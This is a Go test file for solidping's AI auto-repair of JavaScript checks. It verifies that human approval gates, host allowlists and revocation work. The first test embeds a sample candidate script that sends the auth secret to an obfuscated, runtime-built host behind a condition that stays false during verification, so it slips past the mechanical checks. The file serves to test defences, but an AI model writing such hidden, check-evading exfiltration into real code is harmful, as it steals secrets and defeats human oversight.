package aichecks_test

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/fclairamb/solidping/server/internal/aichecks"
	"github.com/fclairamb/solidping/server/internal/checkers/checkerdef"
	"github.com/fclairamb/solidping/server/internal/checkers/checkjs"
	jsconfig "github.com/fclairamb/solidping/server/internal/checkers/checkjs/config"
	"github.com/fclairamb/solidping/server/internal/db/models"
	"github.com/fclairamb/solidping/server/internal/handlers/checks"
)

// storedJS is the check's stored config, parsed, with its real secret.
func (fx *fixture) storedJS(t *testing.T, checkUID string) *checkjs.JSConfig {
	t.Helper()

	stored, err := fx.db.GetCheck(fx.ctx, fx.org.UID, checkUID)
	require.NoError(t, err)

	cfg := &checkjs.JSConfig{}
	require.NoError(t, cfg.FromMap(stored.Config))
	cfg.Secrets = map[string]string{"TOKEN": testSecret}

	return cfg
}

// Regression (spec 2026-10-24-01): the candidate keeps the previous version's
// host and adds a branch to a host built at runtime, behind a condition that
// does not hold in the loop nor the verification run. Every gate passes, so
// `repair: auto` used to apply it. It is proposed, and the reason quotes the
// call whose host the text does not show.
func TestRepairAutoProposesAKeptHostPlusARuntimeHost(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	api, evil := newSink(t), newSink(t)
	candidate := fixedScript + `
if (env.FIRE === "yes") { http.get("http://" + ["local", "host"].join("") + ":` + evil.port + `/", auth); }`
	r.NoError(aichecks.CheckCandidate(oldScript, candidate, map[string]string{"BASE_URL": api.srv.URL}),
		"the mechanical guards do not see the branch")

	fx := newFixture(t, always(candidate), nil)
	check := fx.createAICheck(t, api.srv.URL, "auto")
	fx.driftResults(t, check.UID, 3, driftOutput())

	outcome, err := fx.svc.Repair(fx.ctx, fx.org.UID, check.UID)
	r.NoError(err)
	r.Equal(aichecks.OutcomeProposed, outcome.Outcome, outcome.Reason)
	r.Contains(outcome.Reason, `not applied: the candidate can reach a host its text does not show: `+
		`http.get("http://" + ["local", "host"].join("")`)
	r.Equal(oldScript, fx.script(t, check.UID))
	r.Zero(evil.hits())

	// The proposal carries no grant: a human approves it.
	row, err := fx.db.GetCheckVersion(fx.ctx, check.UID, outcome.Version)
	r.NoError(err)
	snapshot, err := json.Marshal(row.Snapshot)
	r.NoError(err)
	r.NotContains(string(snapshot), "repair_grant")
	r.Contains(string(snapshot), "env.FIRE", "positive control: the snapshot holds the candidate")
}

// An auto-applied version records the hosts the previous version reached,
// and a human edit of its script drops them: the new literal host is then
// reachable with the secret.
func TestRepairAutoGrantsThePreviousHosts(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	api, other := newSink(t), newSink(t)
	fx := newFixture(t, always(fixedScript), nil)
	check := fx.createAICheck(t, api.srv.URL, "auto")
	fx.driftResults(t, check.UID, 3, driftOutput())

	outcome, err := fx.svc.Repair(fx.ctx, fx.org.UID, check.UID)
	r.NoError(err)
	r.Equal(aichecks.OutcomeApplied, outcome.Outcome, outcome.Reason)

	applied := fx.storedJS(t, check.UID)
	hosts, held := applied.RepairAllowlist()
	r.True(held)
	r.Equal([]string{"127.0.0.1"}, hosts)

	result, err := (&checkjs.JSChecker{}).Execute(context.Background(), applied)
	r.NoError(err)
	r.Equal(checkerdef.StatusUp, result.Status, result.Output)

	// A human adds a call to another host.
	edited := strings.Replace(fixedScript, "var r = http.get",
		`http.get("http://localhost:`+other.port+`/", auth);
var r = http.get`, 1)
	stored, err := fx.db.GetCheck(fx.ctx, fx.org.UID, check.UID)
	r.NoError(err)
	r.Contains(stored.Config["ai"], "repair_grant", "positive control: the stored ai block holds the grant")

	cfg := map[string]any(stored.Config)
	cfg["script"] = edited
	_, err = fx.checks.UpdateCheck(fx.ctx, fx.org.Slug, check.UID, &checks.UpdateCheckRequest{Config: &cfg})
	r.NoError(err)

	humanEdit := fx.storedJS(t, check.UID)
	r.Equal(edited, humanEdit.Script)
	r.Empty(humanEdit.AI.RepairGrant, "the edit dropped the grant")
	r.Empty(humanEdit.AI.RepairHosts)
	r.Equal(jsconfig.RepairAuto, humanEdit.AI.Repair)

	result, err = (&checkjs.JSChecker{}).Execute(context.Background(), humanEdit)
	r.NoError(err)
	r.Equal(checkerdef.StatusUp, result.Status, result.Output)
	r.True(other.sawSecret(), "the new literal host is reachable")
}

// A scheduled run refused by the grant flips the check back to `repair:
// propose` and records why; a check not in auto mode is left alone.
func TestRevokeAutoRepair(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	api := newSink(t)
	fx := newFixture(t, always(fixedScript), nil)
	check := fx.createAICheck(t, api.srv.URL, "auto")

	flipped, err := aichecks.RevokeAutoRepair(fx.ctx, fx.db, fx.org.UID, check.UID, "refused: localhost")
	r.NoError(err)
	r.True(flipped)

	stored := fx.storedJS(t, check.UID)
	r.Equal(jsconfig.RepairPropose, stored.AI.Repair)
	r.Equal(oldScript, stored.Script)

	reloaded, err := fx.db.GetCheck(fx.ctx, fx.org.UID, check.UID)
	r.NoError(err)
	r.NotNil(reloaded.ConfigPrivate, "the secrets are kept")

	checkUID := check.UID
	events, err := fx.db.ListEvents(fx.ctx, &models.ListEventsFilter{
		OrganizationUID: fx.org.UID, CheckUID: &checkUID,
		EventTypes: []models.EventType{models.EventTypeCheckAIRepairRevoked},
	})
	r.NoError(err)
	r.Len(events, 1)
	r.Equal("refused: localhost", events[0].Payload["error"])

	// Already propose: nothing more.
	flipped, err = aichecks.RevokeAutoRepair(fx.ctx, fx.db, fx.org.UID, check.UID, "refused: localhost")
	r.NoError(err)
	r.False(flipped)
}
